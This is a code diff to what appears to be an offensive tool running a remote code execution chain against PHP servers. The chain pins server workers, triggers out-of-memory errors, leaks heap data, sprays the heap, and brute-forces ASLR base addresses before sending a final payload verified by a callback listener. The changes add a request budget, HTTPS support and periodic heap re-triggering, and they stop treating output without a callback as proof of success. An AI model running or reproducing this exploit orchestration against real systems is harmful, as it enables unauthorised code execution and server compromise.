@@ -1150,13 +1150,11 @@ def _send_b2_and_check(
 
     if body_text:
         result["output"] = body_text[:2000]
-        if body_text.strip() and not listener:
-            result["success"] = True
+        if body_text.strip():
             result["notes"].append(
-                f"B2 output via {strategy} (attempt {attempt + 1}, "
-                f"no callback — output-only verification)"
+                f"B2 produced output via {strategy} (attempt {attempt + 1}, "
+                f"UNVERIFIED — no callback listener)"
             )
-            return True
 
     return False
 
@@ -1191,14 +1189,25 @@ def _try_chain_d_rce(
     from .classifier import classify
     import urllib.parse
 
+    MAX_CHAIN_D_REQUESTS = 200
+    chain_d_reqs = 0
+
     result: Dict[str, Any] = {
         "success": False, "output": None, "callback_received": False,
         "notes": [], "request_refs": [], "leak_info": None,
     }
 
+    def _budget_ok() -> bool:
+        nonlocal chain_d_reqs
+        if chain_d_reqs >= MAX_CHAIN_D_REQUESTS:
+            result["notes"].append(f"Chain D budget exhausted ({chain_d_reqs}/{MAX_CHAIN_D_REQUESTS})")
+            return False
+        return True
+
     parsed_url = urlsplit(profile.base_url)
     host = parsed_url.hostname or "127.0.0.1"
-    port = parsed_url.port or 80
+    use_tls = parsed_url.scheme == "https"
+    port = parsed_url.port or (443 if use_tls else 80)
     boundary = "C" * 10
 
     # --- Rank candidate offset profiles (best match first) ---
@@ -1265,7 +1274,7 @@ def _try_chain_d_rce(
     # --- Pin workers ---
     holders: List[socket.socket] = []
     try:
-        holders = hold_workers(host, port, workers, timeout=10.0)
+        holders = hold_workers(host, port, workers, timeout=10.0, use_tls=use_tls)
         if len(holders) < max(1, workers - 2):
             result["notes"].append(f"only pinned {len(holders)}/{workers - 1} workers")
     except Exception as e:
@@ -1285,7 +1294,7 @@ def _try_chain_d_rce(
         total_leak_attempts = max(max_attempts, len(candidates))
 
         for attempt in range(total_leak_attempts):
-            if result["success"]:
+            if result["success"] or not _budget_ok():
                 break
             cand_idx = attempt % len(candidates)
             profile_key, offsets, match_tier = candidates[cand_idx]
@@ -1321,6 +1330,7 @@ def _try_chain_d_rce(
                     notes=f"Chain D A1: OOM trigger (attempt {attempt + 1})",
                 )
                 result["request_refs"].append(a1_item.id)
+                chain_d_reqs += 1
                 if a1_exchange.status not in (500, 502):
                     result["notes"].append(f"A1 unexpected status: {a1_exchange.status}")
             except Exception as e:
@@ -1353,6 +1363,7 @@ def _try_chain_d_rce(
                     notes=f"Chain D B1: heap leak (attempt {attempt + 1})",
                 )
                 result["request_refs"].append(b1_item.id)
+                chain_d_reqs += 1
             except Exception as e:
                 result["notes"].append(f"B1 request failed: {e}")
                 continue
@@ -1436,6 +1447,7 @@ def _try_chain_d_rce(
                     notes=f"Chain D A2: heap spray ({strategy_name})",
                 )
                 result["request_refs"].append(a2_item.id)
+                chain_d_reqs += 1
             except Exception as e:
                 result["notes"].append(f"A2 failed: {e}")
                 continue
@@ -1447,6 +1459,7 @@ def _try_chain_d_rce(
                 listener, canary_nonce,
                 main_chunk_candidates=[main_chunk_base],
             )
+            chain_d_reqs += 1
             if _send_b2_and_check(
                 client, profile, store, b2_body, b2_boundary,
                 session_id, listener, canary_nonce,
@@ -1476,6 +1489,8 @@ def _try_chain_d_rce(
         ]
 
         for blind_attempt in range(min(3, max_attempts)):
+            if not _budget_ok():
+                break
             spray = SPRAY_CONFIGS[min(blind_attempt, len(SPRAY_CONFIGS) - 1)]
             session_id = f"{'B' * 26}{blind_attempt:02d}"
 
@@ -1503,6 +1518,7 @@ def _try_chain_d_rce(
                     trust="medium",
                     notes=f"Chain D blind A1 (attempt {blind_attempt + 1})",
                 )
+                chain_d_reqs += 1
             except Exception as e:
                 result["notes"].append(f"blind A1 failed: {e}")
                 continue
@@ -1521,6 +1537,7 @@ def _try_chain_d_rce(
                     body=a2_body, headers=a2_headers,
                     chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
                 )
+                chain_d_reqs += 1
             except Exception:
                 pass
 
@@ -1542,6 +1559,7 @@ def _try_chain_d_rce(
                     listener, canary_nonce,
                     main_chunk_candidates=chunk_candidates,
                 )
+                chain_d_reqs += 1
                 if _send_b2_and_check(
                     client, profile, store, b2_body, b2_boundary,
                     session_id, listener, canary_nonce,
@@ -1572,42 +1590,46 @@ def _try_chain_d_rce(
                 f"trying {len(aslr_bases)} ASLR candidates ({arch_hint})"
             )
 
-            # Single OOM + heap shape, then brute the base address
-            session_id = f"{'C' * 26}00"
             spray = SPRAY_CONFIGS[-1]  # max spray
-
-            a1_body = build_oom_probe_body()
-            a1_headers = {
-                "Content-Type": f"multipart/form-data; boundary={boundary}",
-                "Cookie": f"PHPSESSID={session_id}",
-            }
-            try:
-                client.request(
-                    "POST", profile.base_url,
-                    body=a1_body, headers=a1_headers,
-                    chunked=True, nonce=new_nonce("P2SDA1"), timeout=timeout,
-                )
-            except Exception:
-                pass
-
-            a2_body = build_oom_lite_body(
-                parts=spray["parts"], depth=spray["depth"],
-            )
-            try:
-                client.request(
-                    "POST", profile.base_url,
-                    body=a2_body, headers={
-                        "Content-Type": f"multipart/form-data; boundary={boundary}",
-                        "Cookie": f"PHPSESSID={urllib.parse.quote(session_id, safe='')}",
-                    },
-                    chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
-                )
-            except Exception:
-                pass
+            OOM_REFRESH_INTERVAL = 8  # re-trigger OOM every N B2 attempts
 
             for brute_idx, candidate_base in enumerate(aslr_bases):
                 if result["success"]:
                     break
+                if not _budget_ok():
+                    break
+
+                # Re-trigger A1+A2 OOM periodically to keep heap state fresh
+                if brute_idx % OOM_REFRESH_INTERVAL == 0:
+                    session_id = f"{'C' * 26}{brute_idx:02d}"
+                    a1_body = build_oom_probe_body()
+                    try:
+                        client.request(
+                            "POST", profile.base_url,
+                            body=a1_body, headers={
+                                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                                "Cookie": f"PHPSESSID={session_id}",
+                            },
+                            chunked=True, nonce=new_nonce("P2SDA1"), timeout=timeout,
+                        )
+                        chain_d_reqs += 1
+                    except Exception:
+                        pass
+                    a2_body = build_oom_lite_body(
+                        parts=spray["parts"], depth=spray["depth"],
+                    )
+                    try:
+                        client.request(
+                            "POST", profile.base_url,
+                            body=a2_body, headers={
+                                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                                "Cookie": f"PHPSESSID={urllib.parse.quote(session_id, safe='')}",
+                            },
+                            chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
+                        )
+                        chain_d_reqs += 1
+                    except Exception:
+                        pass
 
                 # Estimate main chunk relative to libphp
                 chunk_base = candidate_base - 0x200000
@@ -1622,6 +1644,7 @@ def _try_chain_d_rce(
                     ],
                 )
 
+                chain_d_reqs += 1
                 if _send_b2_and_check(
                     client, profile, store, b2_body, b2_boundary,
                     session_id, listener, canary_nonce,
@@ -1642,6 +1665,7 @@ def _try_chain_d_rce(
     finally:
         release_workers(holders)
 
+    result["requests_used"] = chain_d_reqs
     return result
 
 
